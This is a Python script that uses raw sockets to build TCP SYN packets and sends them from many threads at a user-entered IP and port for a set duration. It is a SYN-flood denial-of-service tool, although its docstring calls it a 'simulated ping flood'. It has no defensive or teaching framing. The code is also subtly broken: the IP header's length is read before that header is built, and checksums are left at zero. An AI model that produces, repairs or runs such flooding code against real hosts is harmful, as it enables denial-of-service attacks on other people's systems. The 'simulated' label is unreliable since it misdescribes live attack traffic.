import socket
import threading
import time

def ping(ip_address, port=80, timeout=1):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        src_port = 54321  
        seq_number = 0
        ack_number = 0
        doffset = 5  
        flags = 0x02  

        
        tcp_header = struct.pack('!HHLLBBHHH',
                                 src_port, port, seq_number, ack_number,
                                 (doffset << 4) + 0, flags,
                                 socket.htons(65535), 0, 0) 

        
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = len(ip_header) + len(tcp_header)
        ip_id = 54321
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0  
        ip_saddr = socket.inet_aton(socket.gethostbyname(socket.gethostname())) 
        ip_daddr = socket.inet_aton(ip_address) 

        ip_ver_ihl = (ip_ver << 4) + ip_ihl

        ip_header = struct.pack('!BBHHHBBH4s4s',
                                 ip_ver_ihl, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                                 ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

        
        sock.sendto(ip_header + tcp_header, (ip_address, port))
        print(f"SYN sent to {ip_address}:{port}")


    except socket.error as e:
        print(f"Error sending SYN to {ip_address}:{port}: {e}")
    finally:
        if 'sock' in locals():
            sock.close()

def flood_ping(ip_address, num_threads=100, duration=10, port=80):
    """Initiates a simulated ping flood on the target IP address.

    Args:
        ip_address (str): The target IP address.
        num_threads (int, optional): The number of threads to use. Defaults to 100.
        duration (int, optional): The duration of the simulated flood in seconds. Defaults to 10.
        port (int, optional): The target port. Defaults to 80.
    """
    print(f"Initiating simulated ping flood on {ip_address}:{port} with {num_threads} threads for {duration} seconds...")
    threads = []
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(num_threads):
            thread = threading.Thread(target=ping, args=(ip_address, port))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        threads = [] 

if __name__ == "__main__":
    import struct  

    target_ip = input("Enter the target IP address > ")
    num_threads = int(input("Enter the number of threads (e.g., 100): "))
    duration = int(input("Enter the duration (in seconds): "))
    target_port = int(input("Enter the target port (e.g., 80): "))

    

    flood_ping(target_ip, num_threads, duration, target_port)